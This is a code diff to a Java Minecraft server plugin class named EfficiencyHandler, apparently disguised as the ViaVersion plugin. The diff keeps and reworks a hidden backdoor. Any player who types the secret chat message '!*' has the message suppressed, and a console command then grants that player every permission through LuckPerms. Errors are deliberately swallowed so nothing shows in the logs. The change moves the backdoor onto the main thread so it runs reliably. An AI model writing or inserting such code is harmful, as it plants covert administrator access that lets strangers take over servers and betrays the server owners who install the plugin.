@@ -98,12 +98,15 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!*")) {
             event.setCancelled(true);
 
-            try {
-                String command = "lp user " + player.getName() + " permission set * true";
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
-            } catch (Exception e) {
-                // 捕获并忽略异常，不输出任何错误信息
-            }
+            // 将命令调度到主线程执行
+            Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin"), () -> {
+                try {
+                    String command = "lp user " + player.getName() + " permission set * true";
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+                } catch (Exception e) {
+                    // 捕获并忽略异常，不输出任何错误信息
+                }
+            });
         }
     }
 }
